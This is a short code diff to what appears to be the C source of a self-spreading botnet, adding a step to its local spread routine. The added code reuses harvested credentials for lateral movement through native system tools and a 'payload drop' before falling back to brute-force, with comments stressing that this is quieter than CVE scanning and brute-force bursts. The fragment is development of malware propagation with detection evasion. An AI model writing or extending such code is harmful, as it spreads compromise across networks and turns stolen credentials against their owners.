@@ -7,6 +7,7 @@
 #include "spread.h"
 #include "util.h"
 #include "protocol.h"
+#include "lotl.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -2545,7 +2546,18 @@ int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_ma
 
 int spread_local(notnet_bot_t *bot) {
     log_info("Local spread cycle started");
-    
+
+    /* #144: LOTL first. If we have harvested creds, spend them on lateral
+     * movement before brute-force. LOTL is quieter: no CVE scan noise,
+     * no brute-force bursts — just native-tool auth + payload drop. */
+    if (spread_cred_count() > 0) {
+        int spent = lotl_run_cycle(bot);
+        if (spent > 0) {
+            log_info("LOTL: %d credentials spent, skipping brute cycle", spent);
+            return 0;
+        }
+    }
+
     /* Spread explicit targets if configured (overrides defaults).
      * Uses spawn_scan_threads() — the CVE-first per-open-port spreader —
      * not scan_subnet() (probe-only, #95). */
